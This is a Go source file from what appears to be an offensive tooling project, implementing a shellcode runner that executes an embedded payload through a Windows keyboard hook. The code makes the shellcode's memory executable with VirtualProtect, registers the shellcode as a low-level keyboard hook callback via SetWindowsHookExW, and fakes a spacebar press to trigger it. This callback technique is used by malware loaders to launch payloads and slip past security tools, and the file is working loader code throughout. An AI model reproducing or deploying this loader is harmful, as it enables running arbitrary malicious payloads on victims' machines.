package sh

import (
	"fmt"
	"time"
	"unsafe"
	api "github.com/carved4/go-wincall"
)

const (
	WH_KEYBOARD_LL = 13
	VK_SPACE       = 0x20
	WM_KEYDOWN     = 0x0100
)

var (
	hookHandle uintptr
)

func ExecuteViaKeyboardHook() error {
	shellcode := GetEmbeddedShellcode()
	
	var oldProtect uint32
	shellcodePtr := uintptr(unsafe.Pointer(&shellcode[0]))
	
	success, err := api.Call("kernel32.dll", "VirtualProtect",
		shellcodePtr,                         // lpAddress
		uintptr(len(shellcode)),             // dwSize
		0x40,                                // PAGE_EXECUTE_READWRITE
		uintptr(unsafe.Pointer(&oldProtect)), // lpflOldProtect
	)
	if err != nil || success == 0 {
		return fmt.Errorf("VirtualProtect failed: %v", err)
	}
	
	hInstance, err := api.Call("kernel32.dll", "GetModuleHandleW", uintptr(0))
	if err != nil || hInstance == 0 {
		return fmt.Errorf("GetModuleHandleW failed: %v", err)
	}
	
	hookHandle, err = api.Call("user32.dll", "SetWindowsHookExW",
		uintptr(WH_KEYBOARD_LL), // idHook
		shellcodePtr,            // lpfn (our shellcode)
		hInstance,               // hMod
		uintptr(0),              // dwThreadId (0 = all threads)
	)
	if err != nil || hookHandle == 0 {
		return fmt.Errorf("SetWindowsHookExW failed: %v", err)
	}
	
	time.Sleep(10 * time.Millisecond)
	
	
	err = SimulateKeypress()
	if err != nil {
		UnhookKeyboard()
		return fmt.Errorf("failed to simulate keypress: %v", err)
	}
	
	time.Sleep(100 * time.Millisecond)
	
	return UnhookKeyboard()
}

func SimulateKeypress() error {
	success, err := api.Call("user32.dll", "keybd_event",
		uintptr(VK_SPACE), // bVk (spacebar)
		uintptr(0),        // bScan
		uintptr(0),        // dwFlags (key down only)
		uintptr(0),        // dwExtraInfo
	)
	if err != nil || success == 0 {
		return fmt.Errorf("keybd_event failed: %v", err)
	}
	
	return nil
}

func UnhookKeyboard() error {
	if hookHandle == 0 {
		return fmt.Errorf("no hook installed")
	}
	
	success, err := api.Call("user32.dll", "UnhookWindowsHookEx", hookHandle)
	if err != nil || success == 0 {
		return fmt.Errorf("UnhookWindowsHookEx failed: %v", err)
	}
	
	hookHandle = 0
	return nil
}